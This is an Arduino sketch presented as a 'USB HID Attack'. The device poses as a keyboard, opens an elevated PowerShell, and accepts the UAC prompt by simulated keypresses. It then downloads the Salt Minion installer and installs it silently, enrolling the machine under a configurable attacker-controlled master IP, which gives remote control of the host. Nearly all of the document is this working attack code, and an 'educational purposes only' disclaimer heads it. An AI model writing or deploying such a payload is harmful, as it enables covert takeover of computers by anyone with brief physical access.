/*
* _______  __   __  _______  ___      _______  _______      ___  _______ 
*|       ||  | |  ||       ||   |    |   _   ||   _   |    |   ||   _   |
*|  _____||  | |  ||   _   ||   |    |  |_|  ||  |_|  |    |   ||  |_|  |
*| |_____ |  |_|  ||  | |  ||   |    |       ||       |    |   ||       |
*|_____  ||       ||  |_|  ||   |___ |       ||       | ___|   ||       |
* _____| ||       ||       ||       ||   _   ||   _   ||       ||   _   |
*|_______||_______||_______||_______||__| |__||__| |__||_______||__| |__|    
* ------------------------------------------------------------------------
*   Salt-stack minion USB HID Attack
*   Version: 1.0
* ------------------------------------------------------------------------
*   Author: Riki Länsilahti
*   Description: Automates the deployment of a Salt Minion for a master
*   server using a USB HID attack device.
* ------------------------------------------------------------------------
*   DISCLAIMER:
*   This code is intended for educational purposes only. Misuse of this
*   script may violate applicable laws or regulations. The author takes no
*   responsibility for unauthorized use of this code.
* ========================================================================
*/


#include <Keyboard.h>
#include <Keyboard_sv_SE.h>


// master ip
String masterIP = "127.0.0.1";


void setup() {
  Keyboard.begin(KeyboardLayout_sv_SE);
  delay(8000);




  // start pshell as admin
  openPowerShellAsAdmin();
  prepareEnvironment();

  // generate minion name as "minion-*HOSTNAME*"
  Keyboard.print("$minionName = 'minion-' + (Get-ComputerInfo).CsDNSHostName");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);

  // start download
  initiateDownload();

  // start install
  installSaltMinion();

  // Close pshell
  setupFinished();
  Keyboard.end();
}

void openPowerShellAsAdmin() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(10);
  Keyboard.releaseAll();
  delay(200);

  Keyboard.print("powershell");
  delay(10);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(1500);  // wait for uac

  // accept uac
  // leftkey
  Keyboard.press(KEY_LEFT_ARROW);
  delay(100);
  Keyboard.releaseAll();
  delay(100);
  // enter
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(3000);  // wait pshell opening
}

void prepareEnvironment() {
  Keyboard.print("if (-Not (Test-Path 'C:\\\\Temp')) { New-Item -Path 'C:\\\\Temp' -ItemType Directory }");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(500);
}

void initiateDownload() {
  Keyboard.print("$url = 'https://repo.saltproject.io/salt/py3/windows/latest/Salt-Minion-3007.0-Py3-AMD64-Setup.exe'");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);

  Keyboard.print("$output = 'C:\\\\Temp\\\\SaltMinionSetup.exe'");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(200);

  Keyboard.print("Invoke-WebRequest -Uri $url -OutFile $output");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);  // extra wait after dl
}

void installSaltMinion() {
  // setup command
  Keyboard.print("Start-Process -FilePath 'C:\\\\Temp\\\\SaltMinionSetup.exe' -ArgumentList \"/S /master=" + masterIP + " /minion-name=$minionName\" -Wait");
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(5000);  // wait
}

// setup finish, print details
void setupFinished() {
  Keyboard.print("echo \"Install complete, master IP: " + masterIP + ", Minion name: $minionName\"");
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.releaseAll();
  delay(500);
}

void loop() {}
